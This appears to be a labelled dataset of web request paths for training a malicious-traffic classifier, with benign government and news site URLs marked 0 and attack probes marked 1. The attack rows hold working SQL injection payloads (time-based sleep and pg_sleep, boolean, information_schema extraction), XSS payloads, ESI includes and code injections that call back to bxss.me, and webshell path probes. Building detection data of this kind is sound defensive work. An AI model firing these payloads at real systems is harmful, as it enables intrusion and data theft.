request	label
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtc1is5g/5 pe5/pxsxvtd48=&openid=ovl7jjozp-6bjddzzu5cveykb5ag&outer_str=32587&activate_ticket=fdzv9emqaffrnr3xboqhbyog1fsi6rfaomksnpmckqxoo8dbj5 fzedtzplsmcarhf5r3cpeqe4k 7uwbwm4l/bq6ec7cb94oqrb95m7xr8=	0
/****/20211209/10872.html	0
"/****/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/jhcw/gzdt.htm"	1
"/**/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/show.do"	1
/***/0/02/12/16/2121627_889424.jpg	0
/*****/images/ga_px.png	0
/******/resource/code/news/click/dynclicksbatch.jsp?clickids='and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1252742967')))>'0	1
/***/0/01/98/97/1989752_667543.jpg	0
/****/qzfwj/201801/t20180115_669079.html	0
/***/0/00/52/77/527770_283117.jpg	0
/**********/system/2020/05/08/013156742.shtml	0
/****/zt/msss/msxw/201806/t20180621_831485.html	0
/******/xxsjd/img2/3.jpg	0
/****/system/2016/04/29/011993191.shtml	0
"/********/?q=""><script>alert(document.url)</script>"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6d41\u9999\u9601\u8336\u827a\u9986	0
/****/web/search?searchword=1%' or 7659=7764 /*&channelid=287219&perpage=24&templet=1&token=1	1
/****/zgsdt/2021_qydt/202111/w020211101585200438981.jpg	0
/**/system/2021/12/07/012228006.shtml	0
/******/system/2019/06/14/012903434.shtml	0
/**/system/2021/05/11/012159659.shtml	0
/*******/qiye/b-e877554.html	0
"/*****/admin/ccmanage.php?find_enc=1&list=1""><script>alert(777)</script>"	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(122).concat(68).concat(100).concat(85) (require""""socket""""
socket.gethostbyname(""""hitbs"""" """"mkwiwyit4d9c0.bxss.me."""")[3].to_s) """"/****/bmjs/gdyx/"	1
/**********/system/2021/12/12/013493248.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u7bee\u5929\u98df\u54c1\u7ecf\u6d88\u90e8	0
/****/zzxxgk' and 2*3*8=6*8 and 'm3oj'='m3oj/tjj/	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202002/t20200225_148268.html	0
/***/qhnewsbottom.js></script>	1
/****/whs/yw_1286/201902/t20190228_1293380.html	0
/**/system/2021/07/30/javascript:void(0);	1
/****/api/apibankagreementcontroller/validatephone?phonecode=7813&lxsj=18993758322	0
/****/wh/	0
/**/vc/interface/visit.jsp?i_articleid=242459&i_columnid=37&i_webid=1&type=3&url=if(now()=sysdate(),sleep(15),0)	1
/*******/zwxx_11337/zcjd/mtjd/	0
/****/bmkx/sfgw/202108/w020210819327343762434.png	0
"/***/getsubject?data={""subject_id"":170,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":504,""sign"":""""}"	0
/****/xxgknb/2009/list.html?new=0'xor(if(now()=sysdate(),sleep(15),0))xor'z	1
/**/sustainability/csrreports/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/bmkx/snmj/202007/w020200706537378726954.png	0
/****/bmkx/ygjt/202103/t20210311_178405.html	0
/**/zwfw/index.html	0
/****/10/entering-whole-nother-world.html	0
/**********/system/2020/10/10/013261277.shtml	0
/****/jjdytpgjz/index_3.html	0
/****/system/2019/01/26/012795899.shtml	0
/****/bmkx/sjsj/201701/t20170124_85250.html	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(621)</script>?_=1630311535666"	1
/***/com/login.asp?logintype=xm') and 7114=6831 and ('mrxz'='mrxz	1
"/********/index.php?show_record_links=1&table=products"""">alert(777);&add_new_item=1"	1
/****/czgk/bmyjs/rmtt/gsl/201602/t20160218_318466.html	0
/****/web/search/search?page=3&channelid=287219&searchword=1&keyword=1%' and 7022=7022 and '%'='&orderby=-docreltime&perpage=7&outlinepage=10	1
/*******/202107/202107121703391104.html	0
/*****/module/photopath.php	1
"/******/system/2021/06/09/013399706'""/><script>alert(2294)</script>.shtml"	1
/*******/qiye/b-e517093.html	0
/*****/gy42/ljcpgyview.asp?id=28835383&l2=\ufffd\ufffd\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
/****/jtdt/jt17/201812/w020181210624490637569.jpg	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/video_details.html?from=androidapp&id=1263718&version=3.6.0	0
/****/wjj/tpbd/	0
/****/web/search/search?page=3&channelid=287219&searchword=1&keyword=1') and 5834=(select 5834 from pg_sleep(5)) and ('oyfr'='oyfr&orderby=-docreltime&perpage=7&outlinepage=10	1
/**********/system/2020/03/24/013123428.shtml	0
/*******/237lk.php	1
/*****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u4e09\u8425\u70e4\u997c\u5e97	0
/*****/b-e1817786.html	0
/***/003/002/976/00300297613_3169e393.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u4f73\u60e0\u9910\u5385	0
/****/web/css/jquery-ui.min.css	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u738b\u6625\u71d5\u8d27\u8fd0\u90e8	0
/****/0113/309121.shtml	0
/**********/system/2020/03/21/013120978.shtml	0
/*******/qiye/businesses-e52686_19.html?category_id=	0
/***/interface/daily_clickcount.json.jsp?callback=jquery1910018709969193926312_1639991068239	0
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_/xfs.bxss.me/list.html	1
/***/0/01/75/49/1754936_067744.jpg	0
/****/zt/2018wznb/zzqbm/201901/p020190125545152073037.pdf	0
/****/zjdt/gcjsbzgl/gcjybz'||'/1.htm	1
/**********/system/2020/03/28/013127064.shtml	0
/****/xxgkml/qtfdxx/zcjd/szcjd_1/202103/p020210312359190465310.docx	0
/**********/system/2020/05/31/013174300.shtml	0
/******/scy_gj_ywlywxin_03.jpg	0
/*******/d8om6.php	1
/***/0/02/03/18/2031867_444136.jpg	0
/**********/system/2020/04/04/013132092.shtml	0
/****/category/pinpaijianshe?page=1 and 5889=5889#	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6768\u7389\u521a\u7279\u8272\u5168\u7f8a\u6c64\u7f8a\u6742\u788e\u5e97	0
/****/shzr/202108/t20210809_314103.html	1
/***/0/00/95/73/957347_998947.png	1
"/**/ui/lib/easyui/'""""()&%<acx><script >qv9d(9854)</script>/jquery.panel.js"	1
/****/qzfwj/202106/p020210603549017569634.pdf	0
/***/swimming-pants?94533.html	0
/*****/sao.php	1
/*******/k2qgm7q7.php	1
/*****/system/2011/01/04/010264428.shtml	0
/****/qzfwj/201801/t20180115_668634.html	0
/******/system/2012/11/13/010951117.shtml	0
/zwxx_11337/****/202011/t20201127_2384629.html	0
/**********/system/2020/04/15/javascript:void();	1
/****/web/search/search?page=3&channelid=287219&searchword=1) and 6601=(select 6601 from pg_sleep(5)) and (8832=8832&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10	1
/****/gjgk/' and 'x'='y	1
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/***/003/001/764/00300176471_12385c70.jpg	1
/**********/system/2021/08/06/013431306.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8d85\u524d\u70b9\u8bc4	0
/******/2013qglh/jjlh/	0
/**/aboutus/leadership/boardofdirectors/	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u591a\u5473\u5148\u68ee\u98df\u54c1\u5e97	0
/*******/qiye/b-e339714.html	0
/******/system/2010/11/17/010234778.shtml	0
/****/2021/09/79728.html	0
/zwxx_11337/****/201808/t20180816_977125.html	0
/**********/system/2020/04/23/013147170.shtml	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u87f9\u90fd\u6c47\u6c34\u4ea7\u54c1\u7ecf\u8425\u90e8\u524d\u8fdb\u5357\u8def\u5e97	0
"/************/template/jcse/110105008056111/16/images/plugin'""""()&%<acx><script >1itm(9516)</script>/voice/hzrecorder.js"	1
/****/if(now()=sysdate(),sleep(15),0)/	1
/****/wdsjs/hfswsj/202009/t20200903_171861.html	0
/**********/system/2020/02/03/013070152.shtml	0
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/***/003/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/20210309/9519.html	0
/***/0/10/36/04/10360486_930389.jpg	0
"/******/jslib/urite/urite.min.js/<img src=""javascript:alert(19)"">"	1
/***/0/02/09/39/2093953_982931.jpg	0
/zwxx_11337/****/202010/t20201029_2270415.html	0
/***/mobile_h5/waparticledetail.do?article_id=202008270905231013&contenttype=article	0
/****/system/2016/03/29/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5f90\u5957\u4e61\u9a6c\u6d77\u5251\u8d27\u8fd0\u90e8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u590f\u6cab\u70e7\u70e4\u5e97	0
/****/index_wap.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqslt/201808/t20180816_977257.html	0
/****/b-e1201174.html	0
"/************/search.do?begin=1&end=1&eq=1&oq=1<esi:include src=""""http://bxss.me/rpb.png""""/>&p=1&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111"	1
/***/blockdata/getsearchinfo.do?&title=\u6c38\u57ce\u7164\u7535\u63a7\u80a1\u96c6\u56e2\u6709\u9650\u516c\u53f8 \u8d70\u5f31	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\ufffd\ufffd\u0425	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u4ec1\u9547\u7530\u5b9d\u8d27\u8fd0\u4fe1\u606f\u90e8	0
"/searchfinancial.jspx?channelid=1480&producttype=2&querystr=1&renew=0<esi:include src=""""http://*******/rpb.png""""/>&termtype=0"	1
/*/public/viewclick/?addclick=0'xor(if(now()=sysdate(),sleep(6),0))xor'z&classid=132&id=270	1
/zzsl' and 2*3*8=6*8 and 'ewix'='ewix/******/202107/t20210723_2938511.html	1
/**********/system/2018/09/25/012706771.shtml	0
"/****/category/quanqiuguanzhuredian?page=*/-->'""""></iframe></script></style></title></textarea><script >alert(19908)</script>"	1
/****/system/2012/12/11/010975919.shtml	0
/******/system/2021/02/01/javascript:window.close();	1
"/****/项目巡礼/*/-->'""""></iframe></script></style></title></textarea><script >alert(61163)</script>?page=1"	1
/*****/mavideo/gvideos.php?gid=1 and 1=2	1
/******/usercenter/index?qrcode=scanqrcode&code=051x9zfa1sg6kc0hdwfa1bbane0x9zfq	0
/******/resource/js/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/calendar.js	1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%' or 1233=8624 and '%'='	1
/***/0/01/89/48/1894852_924533.jpg	0
/****/bmkx/sjhj/202009/t20200923_172535.html	0
/*******/qiye/b-e1505826.html	0
"/****/wp-content/plugins/nextgen-gallery/nggallery.php?test-head='"""">alert(777);"	1
"/**/ui/lib<esi:include src=""""http://bxss.me/rpb.png""""/>/jquery/jquery.min.js"	1
/**********/system/2021/12/10/013492716.shtml	0
"/**/ui/lib<esi:include src=""""http://bxss.me/rpb.png""""/>/easyui/themes/bootstrap/linkbutton.css"	1
/********//33/4dcp2jnz/xhr_send?t=1633731919471	1
/******/usercenter/index?qrcode=40716	0
/****/zt/zfgzbg_1537/201707/t20170730_331021.html	0
"/************/template/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js/<img src=""javascript:alert(4638)"">"	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e0a\u6d77\u590d\u65e6\u4f73\u660e\u4e13\u5356\u5e97	0
/wp-content/******/optimizepresstheme/******/index.php	1
/******/system/2017/03/05/012256235.shtml	0
/zwxx_11337/****/202002/t20200203_1939671.html	0
/*******/zwgk/zfxxgk/fdzdgknr/qtfdxx/ggzypz/	0
"/****/czgk/bmyjs/zzqfyxt/zzqgyzzqtlfy_1817/\""javascript:void(0)\"""	1
/****/20201204/e111604553.html	0
/****/js' and 2*3*8=6*8 and 'yw2t'='yw2t/lib/jquery.js	1
/********/ddjs/wzdt/kjcx/xyfw/jcjg/rlzy/nbfw/xxgk/qyjbxx/gjcp/yqyb/images/jianfan.js	0
/****/bmkx/bxss.me.html	1
/***/0/01/20/95/1209520_855032.jpg	0
/****/byszf/201802/w020180212601237344706.jpg	0
/****/xxgkml/zdmsxx/xcyxdn/201711/t20171121_97308.html	0
/****/web/search?channelid=222832&searchword=\u7075\u65b0\u77ff\u7389\u660e\u88c5\u9970\u6750\u6599	0
/***/003/004/492/00300449235_1083523a.jpg	0
/**********/system/2021/02/20/013338656.shtml	0
/**********/system/2020/12/09/013299081.shtml	0
/****/[tianfuzhuce]guanfangzhan.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u674e\u65fa\u9547\u5c0f\u674e\u998d\u998d\u5e97	0
/****/czgk/bmyjs/zzqfyxt/xxqrmfy/201802/t20180224_693912.html	0
/****/system/2016/06/05/012022915.shtml	0
"/************/template/jcse/110105008056111/16/images/plugin/criteria'""""()&%<acx><script >lzxm(9796)</script>/criteria.js"	1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u7ea2\u82b1\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\u02bd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/************/static/contract/customized/pdf_customized_mobile.js?6.0.8.398	0
"/************/template/jcse/110105008056111/16/images/plugin/waterpull<esi:include src=""""http://bxss.me/rpb.png""""/>/pinterest_grid.js"	1
/****/system/2014/01/28/011298761.shtml	0
/******/usercenter/index?qrcode=scanqrcode&code=081td8000luizm1mu6100hismd0td80o	0
/******/fy/rj/	0
/****/xxxsd/sjjs/	0
/*******/qiye/b-e2155355.html	0
/zwxx_11337/****/201905/t20190514_1485483.html	0
/*******/kd26hej.php	1
/***/0/00/83/84/838462_693176.jpg	0
"/z'""""()&%<acx><script >bery(9174)</script>/******/index/ef90f68c5578ccfd29b18250450d0233.css"	1
"/******/jslib/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/ckplayer.js"	1
/*******/zwgk/czgk/bmyjs/zzqfyxt/wzszjrmfy/	0
"/****/bmkx/sfgw/202102/"""	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4e0e\u515a\u540c\u884c	0
/***/resource/fonts/fontawesome-webfont.ttf?v=javascript:window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()//	1
/*******/201906031118568255	0
"/****/北京?page=1'""""()&%<acx><script >vvqn(9852)</script>"	1
/**********/system/2021/10/08/013461299.shtml	0
/******/20211028.jpg	0
/zwxx_11337/****/201809/t20180917_1049123.html	0
"/****/system/2021/09/01'""/><style>@import""javascript:alert(1848)"";</style>/013442863.shtml"	1
/**********/system/2021/06/08/013398638.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zytxj/	0
/******/cms/www/201607/15151807d12e.jpg	1
/******/nxrq_priv_weibo_4.png	0
/****/czgk/bmyjs/qtdw/zzqhtglzx/202103/t20210309_2619797.html	0
"/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=*/-->'""""></iframe></script></style></title></textarea><script >alert(61429)</script>&perpage=15&outlinepage=10"	1
"/*****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/****/wdszs/hfsz/202110/t20211008_195108.html	0
/**********/system/2020/04/25/013148596.shtml	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(6491)</script>?_=1630312381629"	1
/zwxx_11337/****/201912/t20191209_1876966.html	0
/******/web/messagebook/que_code.jsp?random=' and 'f'='f') --	1
/****/xxxsd/gjfc/201812/t20181211_198639.html	0
"/****/京津冀地区?page='""""()&%<acx><script >qdi6(9644)</script>"	1
"/************/template/jcse/110105008056111/16/images<esi:include src=""""http://bxss.me/rpb.png""""/>/plugin/voice/hzrecorder.js"	1
/****/20210220/e116705675.html	0
"/**/ui'""""()&%<acx><script >j2yp(9563)</script>/lib/easyui/themes/bootstrap/linkbutton.css"	1
/****/qxy/ldhd	0
/*****/system/2014/03/10/javascript:window.print()	1
/**********/system/2021/10/18/013466104.shtml	0
/**********/system/2020/04/07/javascript:void(0);	1
/****/tpxw/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/	1
/****/b-e286390.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7f8e\u5c1a\u9020\u578b\u5ba4	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9633\u5149\u852c\u679c\u8d85\u5e02	0
/***/0/02/11/70/2117036_037040.jpg	0
/***/0/01/92/21/1922144_193953.jpg	0
/if(now()=sysdate(),sleep(15),0)/*/slick.css	1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15) and 7814=7814#&outlinepage=10	1
/**********/system/2021/08/27/013440654.shtml	0
"/*/201020-1/videos-detail'""""()&%<acx><script >edjc(9316)</script>/89f1a343e891a0a00a940d84f9626bcf.js"	1
/****/b-e379190.html	0
/zwxx_11337/****/ytdd/202003/t20200311_1986456.html	0
"/******/hhs/sshx/<img src=""javascript:alert(60)"">"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u4e1c\u65ed\u673a\u7535\u5f00\u53d1\u90e8	0
/**********/system/2012/02/02/javascript:window.print()	1
"/****/bmkx/sgaj/"""".gethostbyname(lc(""""hitzl"""".""""zgxqidkk2633b.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(110).chr(86).chr(97).chr(68).""""/t20181208_112298.html"	1
/****/bmkx/sajj/201907/t20190704_139305.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh<esi:include src=""""http://bxss.me/rpb.png""""/>_2065/list.html"	1
/****/ztbd/202102/	1
/zwxx_11337/****/index_12.html	0
/***********/meizhoujiangtang' and 2*3*8=6*8 and 'hlya'='hlya/index_6.html	1
/****/system/2021/07/21/javascript:window.close();	1
/****/bmkx/jtysj/201802/t20180228_100626.html	0
/****/zfgzbg	0
/***/0/02/12/34/2123402_889493.jpg	0
"/***/col6/index.html"""" and """"x""""=""""x"	1
/****/'.gethostbyname(lc('hitcm'.'coazlesh54d2c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(122).chr(89).chr(108).chr(68).'/202001/t20200119_146666.html	1
"/**/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/***/003/003/741/00300374171_05d51edf.jpg	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u65f6\u5c1a\u7f8e\u53d1\u5e97	0
/******/qhzz/	0
/****/20201223/e112933352.html	0
/******/system/2017/11/13/javascript:window.print()	1
/**********/system/more/207000000000000/0040/207000000000000_00004030.shtml	0
/****/xqdt/jyx/index_3.html	0
/**********/system/2021/09/30/javascript:window.print()	1
/*****/gy48/cpgyss.asp?key=\u4f5b\u5c71\u6db2\u538b\u9600&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/********/ddjs/wzdt/xxgk/qyzdsx/kjcx/kycg/zscq/xwzx/szyw/images/jianfan.js	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u4f9b\u9500\u793e\u8d38\u6613\u5927\u697c\u897f\u95e8\u6279\u53d1\u90e8	0
/**********/2021-if(now()=sysdate(),sleep(9),0)-31.html	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u8001\u8d3e\u6821\u6cb9\u6cf5\u670d\u52a1\u90e8	0
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/****/20170124/javascript:void(0);	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgwvbnbbdfnfpkda8wul2ri=&openid=ovl7jjpouandnontm0r_aevkg8sa&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhbx6oeph/lqgwnnqfadzxfzhoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbiwxpqsqerez6cxkcoiomtbq=	0
/***/rlzy/rcgk/gjjtwzq/xxgk/qyjbxx/xwzx/xydt/gjcp/dgdz/	0
/*****/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user	1
/**************/renwu	0
/****/web/search?searchword=1&channelid=287219%') or 1023=0133 and '%'='&perpage=24&templet=1&token=1	1
/****/czgk/bmjs/zzqfyxt/hsbrmfy/	0
/***/0/02/12/44/2124427_933682.jpg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u96f7\u857e\u5364\u8089\u5e97	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5fb7\u80dc\u5b50\u7ae5\u4e8c\u624b\u8f66\u54a8\u8be2\u670d\u52a1\u90e8	0
"/*/170822-1'""""()&%<acx><script >rcwk(9624)</script>/index/06defa41f3b0c6ebc8da65f95d7f2f20.css"	1
"/**/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/****/tjc	0
/tour-list/?keywords=<input/*********/
*/onfocus=alert(123);>&start_date=xxxxxxxxxxxx&avaibility=13	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\u03fb\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u03fa\ufffd	0
/*******/qiye/b-e2108249.html	0
/*******/xa1.php	1
/****/category/:alias</script><script>dgy2(9560)</script>	1
/****/images/applicationresult.png	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5609\u9633\u5efa\u6750\u7ecf\u9500\u90e8	0
/***/003/004/426/00300442676_6d8a0f38.jpg	0
/****************/file/loadimage/?id=189291ad-984c-42d7-b21b-1c7e288bda7c&dt=2021-12-20_10:12:43	0
/wp-content/*******/info.php	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5409\u5ca9\u5546\u884c	0
/******/system/2012/05/21/010775242.shtml	0
/********/customer/style/;1<script>abuz(9702)</script>	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(3580)</script>?_=1630311963251"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9ad8\u6708\u5cf0\u6c7d\u8f66\u4fee\u7406\u4e2d\u5fc3	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u5b81\u4e1c\u9547\u592b\u59bb\u4fdd\u5065\u54c1\u5e97	0
/****/system/2021/05/21/javascript:dozoom(9)	1
/******/ml/tp/	0
"/****/bysw/"""" """"a"""".concat(70-3).concat(22*4).concat(118).concat(86).concat(110).concat(66) (require""""socket""""
socket.gethostbyname(""""hittt"""" """"segsxphm668f4.bxss.me."""")[3].to_s) """"/"	1
/**********/system/2020/06/02/013176322.shtml	0
"/*****/index.php?action=list&order=nan""/><script>alert(777);</script>me&srt=yes"	1
/*******/201909/201909250900561018.html	0
"/******/web/jpage/dataproxy.jsp/""><script>alert(3378)</script>?startrecord=1&endrecord=45&perpage=15"	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/bzxajgc/gys.htm"	1
"/**/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom=""'/></script><script>alert(777)</script>"	1
/****/api/apibankagreementcontroller/sendsoci202?gmsfhm=450923199604295128&zply=01&zphzm=	0
/*******/sbjgcjsyjzx	0
/****/czgk/bmjs/sydw1/jst/202108/t20210818_2978756.html	0
/*******/qiye/b-e2135525.html	0
/****/1022/document.location.href	1
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/\""javascript:void(0)\"""	1
/*******/3atc1.php	1
/****/20210513/9832.html	0
/***/003/004/205/00300420579_fee0d409.png	0
/__local/*/9a/1b/72ced94b186ebd76be916cd8dbd_8ac726a8_ff24.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5e73\u6da6\u519c\u7267\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/web/search?searchword=1&channelid=287219&perpage=24%') and 8266=8266 and '%'='&templet=1&token=1	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u738b\u4e95\u65b0\u6751\u88c5\u9970\u6750\u6599\u5927\u5168	0
/*******/qiye/jhwddk_e144560504.html	0
/******/ew/20190508105710921.png	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u515a\u53f2\u5b66\u4e60	0
/*******/qiye/spot-e106552.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4fca\u5e38\u4fdd\u5065\u98df\u54c1\u7ecf\u9500\u90e8	0
/zwxx_11337/****/201803/t20180316_705633.html	0
/********/ywly/gccb/nygc/xwzx/zgsdt/ddjs/nbfw/gjcp/	0
/post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=,alert(/********************************/)	1
/*****/20210623/10035.html	0
/****/czgk/bmyjs/zzqfyxt/zwszjrmfy/202103/t20210309_2620328.html	0
/****/qzfwj/201801/t20180115_669493.html	0
/****/gjzqq/index.html?continent= and 5440=5440#	1
/****/20211028/n.src	0
/****/bmkx/sgaj/201806/w020180612358981821763.jpg	0
/**********/system/2021/04/29/013377936.shtml	0
/******/457/bxss.me.2.1.js	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u7965\u6607\u673a\u68b0\u52a0\u5de5\u90e8	0
/******/gjgy/st/	0
/****/if(now()=sysdate(),sleep(12),0)/fdzdgknr.htm	1
/**********/system/2021/12/20/013497242.shtml	0
/****/cache_template/dishenxi/img/piaowenhao.php	1
/****/bmkx/ygjt/201909/t20190912_142100.html	0
/*******/ui/lib/security/sm2.js	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7965\u9014\u7269\u8d44\u6709\u9650\u516c\u53f8	0
/******/ew/20161024141257354.jpg	0
/********/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
"/' 'a'.concat(70-3).concat(22*4).concat(120).concat(75).concat(118).concat(79) (require'socket'
socket.gethostbyname('hitqq' 'rinrkbsf7d606.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/catesearchbtn.js"	1
